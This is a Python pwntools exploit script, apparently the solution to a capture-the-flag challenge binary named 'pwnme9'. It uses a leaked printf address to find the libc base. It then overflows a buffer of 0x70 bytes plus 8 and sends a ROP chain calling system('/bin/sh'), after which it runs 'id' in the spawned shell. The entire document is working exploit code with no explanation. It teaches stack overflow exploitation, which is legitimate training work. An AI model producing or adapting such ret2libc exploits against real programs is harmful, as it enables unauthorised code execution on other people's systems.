from pwn import *
import subprocess
import time

e = ELF('./pwnme9')
sys_libc_path = subprocess.check_output(['bash','-c','ldd ./pwnme9 | awk \'/libc.so.6/ {print $3}\'']) .decode().strip()
libc = ELF(sys_libc_path)
context.binary = e
context.log_level = 'warn'

io = process('./pwnme9')
io.recvuntil(b'Interesting... ')
printf_leak = int(io.recvline().strip(), 16)
libc.address = printf_leak - libc.symbols['printf']
log.warn(f"libc base = {hex(libc.address)}")

binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

rop     = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

payload  = b'A' * 0x70 + b'B' * 8
payload += p64(ret)        # 16-byte alignment for movaps in system()
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

io.sendline(payload)
time.sleep(0.3)
io.sendline(b'id; echo SHELL_OK')
time.sleep(0.3)
io.sendline(b'exit')
print(io.recvall(timeout=3).decode(errors='replace'))